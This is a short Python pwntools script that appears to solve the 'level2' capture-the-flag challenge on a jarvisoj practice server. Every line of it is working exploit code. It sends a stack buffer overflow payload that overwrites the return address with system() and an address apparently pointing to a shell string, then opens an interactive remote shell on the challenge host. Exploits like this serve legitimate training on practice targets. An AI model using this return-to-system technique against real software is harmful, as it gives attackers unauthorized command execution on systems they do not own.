#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'

context(arch='i386', os='linux')

ELF_IMG = './level2'
BSS = 0x0804A02C

# io = process(ELF_IMG)
io = remote('pwn2.jarvisoj.com', 9878)

elf = ELF(ELF_IMG)

offset = 0x88

payload = 'a' * (offset + 4) + p32(elf.symbols['system']) + p32(0xdeadbeef) + p32(0x0804a024)

print repr(payload)

io.sendlineafter(':\n', payload)

io.interactive()
